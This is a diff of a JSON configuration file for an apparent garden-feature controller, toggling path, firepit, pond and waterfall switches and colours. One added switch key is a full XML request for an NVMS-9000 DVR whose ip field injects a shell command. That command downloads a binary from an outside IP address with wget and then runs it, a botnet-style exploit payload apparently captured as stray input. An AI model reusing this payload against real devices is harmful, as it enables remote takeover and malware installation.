@@ -7,31 +7,19 @@
         "pondThree"
     ],
     "switches": {
-        "path": true,
-        "firepit": true,
-        "pondOne": true,
-        "pondTwo": true,
-        "pondThree": true,
-        "path=on": true,
-        "firepit=on": true,
-        "pondOne=on": true,
-        "pondTwo=on": true,
-        "pondThreeColor=%23000000": true,
-        "firepitColor=%23000000": true,
-        "pondTwoColor=%23000000": true
+        "path": false,
+        "firepit": false,
+        "pondOne": false,
+        "pondTwo": false,
+        "pondThree": false,
+        "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=\"filterTypeMode\">refuse</filterType><filterList type=\"list\"><itemType><addressType type=\"addressType\"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://107.174.137.24/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt.rep;)</ip></item></filterList></content></request>": true
     },
     "switchColors": {
-        "path": "#8f2d2d",
-        "firepit": "#4f4f4f",
-        "pondOne": "#1d9034",
-        "pondTwo": "#1968e6",
-        "pondThree": "#000000",
-        "path=on": "pathColor=%23000000",
-        "firepit=on": "firepitColor=%235972c0",
-        "pondOne=on": "pondOneColor=%231430b8",
-        "pondTwo=on": "pondTwoColor=%23c81e1e",
-        "firepitColor=%23000000": "pondOneColor=%23000000",
-        "pondTwoColor=%23000000": "pondThreeColor=%23000000"
+        "path": "#d41c1c",
+        "firepit": "#5972c0",
+        "pondOne": "#1430b8",
+        "pondTwo": "#c81e1e",
+        "pondThree": "#19b90e"
     },
     "waterfallNames": [
         "waterfallOne",
@@ -40,7 +28,7 @@
     ],
     "waterfalls": {
         "waterfallOne": false,
-        "waterfallTwo": true,
+        "waterfallTwo": false,
         "waterfallThree": false
     },
     "waterfallHeaders": {
